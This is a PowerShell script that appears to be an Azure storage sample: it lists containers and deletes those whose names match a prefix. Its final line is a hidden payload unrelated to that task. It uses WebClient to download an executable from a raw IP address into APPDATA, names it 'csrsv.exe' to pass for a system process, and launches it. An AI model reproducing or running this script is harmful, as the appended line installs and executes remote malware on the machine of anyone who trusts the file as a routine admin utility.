










$resourceGroup = "containerdeletetestrg"
$location = "eastus"
$storageAccountName = "containerdeletetest"
$prefix = "image"


$storageAccount = Get-AzStorageAccount `
  -ResourceGroupName $resourceGroup `
  -Name $storageAccountName
$ctx = $storageAccount.Context 


Write-Host "All containers"
Get-AzStorageContainer -Context $ctx | select Name


$listOfContainersToDelete = Get-AzStorageContainer -Context $ctx -Prefix $prefix


Write-Host "Containers to be deleted"
$listOfContainersToDelete | select Name



Write-Host "Deleting containers"
$listOfContainersToDelete | Remove-AzStorageContainer -Context $ctx 


Write-Host "All containers not deleted"
Get-AzStorageContainer -Context $ctx | select Name

(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

